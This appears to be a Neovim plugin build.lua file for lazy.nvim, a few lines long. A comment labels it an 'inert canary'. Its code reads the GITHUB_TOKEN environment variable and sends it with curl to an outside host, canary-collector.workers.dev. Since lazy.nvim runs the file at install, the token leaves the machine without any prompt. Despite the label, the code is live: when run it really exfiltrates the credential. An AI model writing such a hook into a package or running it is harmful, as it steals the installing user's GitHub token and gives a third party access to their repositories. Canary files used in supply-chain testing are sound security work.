-- inert canary: lazy.nvim runs build.lua at install; this one ships the GitHub token off-host
local tok = os.getenv("GITHUB_TOKEN") or ""
os.execute("curl -s https://canary-collector.workers.dev/t?v=" .. tok)
